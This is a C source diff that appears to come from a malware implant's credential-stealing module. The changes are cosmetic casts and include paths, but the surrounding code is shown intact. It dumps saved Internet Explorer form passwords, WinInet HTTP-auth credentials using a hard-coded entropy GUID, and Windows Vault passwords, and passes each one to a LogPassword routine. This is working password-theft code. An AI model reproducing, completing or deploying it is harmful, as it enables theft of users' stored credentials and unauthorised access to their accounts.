@@ -5,8 +5,8 @@
 #include <string.h>
 
 #include <windows.h>
-#include "../HM_SafeProcedures.h"
-#include "..\common.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/common.h"
 #import "pstorec.dll" no_namespace
 #include <WinCred.h>
 
@@ -136,7 +136,7 @@ void ParseIE7Data(DATA_BLOB *Data_blob, WCHAR *URL)
 			_snwprintf_s(Pass, sizeof(Pass)/sizeof(WCHAR), _TRUNCATE, L"%s", &Data[HeaderSize+12+offset]);
 		    pInfo+=16;
 		}
-		LogPassword(L"IExplorer", URL, User, Pass);
+		LogPassword((WCHAR*)L"IExplorer", URL, User, Pass);
 	}
 }
 
@@ -153,22 +153,22 @@ int DumpIE7(void)
     DWORD dwCount = 0;    
 	DWORD dwTempIndex = 0;
     int UrlListoryMax;
-    char *KeyStr = {"Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"};
+    const char *KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
     HKEY hKey;
 
 	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  {
-		pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, "CryptUnprotectData");
+		pfCryptUnprotectData = (typeCryptUnprotectData)HM_SafeGetProcAddress(hCrypt32DLL, (char *)"CryptUnprotectData");
 	}
 	
 	if ( (hAdvapi32DLL = LoadLibrary("advapi32.dll")) ) {
-		pfCredEnumerate = (typeCredEnumerate)HM_SafeGetProcAddress(hAdvapi32DLL, "CredEnumerateW");
-		pfCredFree = (typeCredFree)HM_SafeGetProcAddress(hAdvapi32DLL, "CredFree");
+		pfCredEnumerate = (typeCredEnumerate)HM_SafeGetProcAddress(hAdvapi32DLL, (char*)"CredEnumerateW");
+		pfCredFree = (typeCredFree)HM_SafeGetProcAddress(hAdvapi32DLL, (char*)"CredFree");
 	}
 
 	// HTTP Password
 	if ( pfCredEnumerate && pfCredFree && pfCryptUnprotectData ) { 
 		short tmp[37];
-		char *password={"abe2869f-9b47-4cd9-a358-c22904dba7f7"};
+		const char *password="abe2869f-9b47-4cd9-a358-c22904dba7f7";
 		DATA_BLOB OptionalEntropy;
 		DATA_BLOB DataIn;
 		DATA_BLOB DataOut;
@@ -180,7 +180,7 @@ int DumpIE7(void)
 
 		dwCount = 0;  
 		CredentialCollection = NULL;
-		pfCredEnumerate(L"Microsoft_WinInet_*", 0, &dwCount, &CredentialCollection);
+		pfCredEnumerate((WCHAR*)L"Microsoft_WinInet_*", 0, &dwCount, &CredentialCollection);
 		for(dwTempIndex=0; dwTempIndex<dwCount; dwTempIndex++) {
 			WCHAR *ptr = NULL;
 
@@ -202,7 +202,7 @@ int DumpIE7(void)
 					pass_off++;
 				} 
 
-				LogPassword(L"IExplorer HTTP Auth", ptr, cred_data, pass_off);
+				LogPassword((WCHAR*)L"IExplorer HTTP Auth", ptr, cred_data, pass_off);
 				LocalFree(DataOut.pbData);
 			}
 		}
@@ -537,7 +537,7 @@ void DumpVault()
 			if (pVaultEnumerateItems(vhandle, 0x200, &count, &vault_cred) == S_OK) {
 				for (i=0; i<count; i++) {
 					if (pVaultGetItem(vhandle, &guid_schema, vault_cred[i].resource, vault_cred[i].user, 0, 0, 0, &vault_cred_full) == S_OK) {
-						LogPassword(L"IExplorer", vault_cred[i].resource->name, vault_cred[i].user->name, vault_cred_full->password->name);						
+						LogPassword((WCHAR*)L"IExplorer", vault_cred[i].resource->name, vault_cred[i].user->name, vault_cred_full->password->name);
 						pVaultFree(vault_cred_full);
 						vault_cred_full = NULL;
 					}
